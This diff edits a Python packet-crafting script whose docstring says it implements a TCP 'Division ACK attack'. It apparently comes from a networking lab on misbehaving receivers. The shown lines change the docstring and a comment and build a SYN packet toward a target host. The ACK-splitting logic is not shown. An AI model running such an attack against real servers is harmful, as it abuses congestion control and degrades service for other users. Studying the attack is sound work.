@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 """
-This file implements the Optimal Ack attacker.
+This file implements the Division ACK attack.
 """
 
 import argparse
@@ -20,7 +20,7 @@ if __name__ == "__main__":
     print "Making connection to %s from port %d." % (args.host, args.sport)
     print "Starting three-way handshake..."
     ip_header = IP(dst=args.host) # An IP header that will take packets to the target machine.
-    seq_no = INIT_SEQ_NO # Our starting sequence number (not really used since we don't send data).
+    seq_no = INIT_SEQ_NO # Our starting sequence number 
     window = WIN_SIZE # Advertise a large window size.
 
     syn = ip_header / TCP(sport=args.sport, dport=args.dport, flags='S', window=window, seq=seq_no) # Construct a SYN packet.
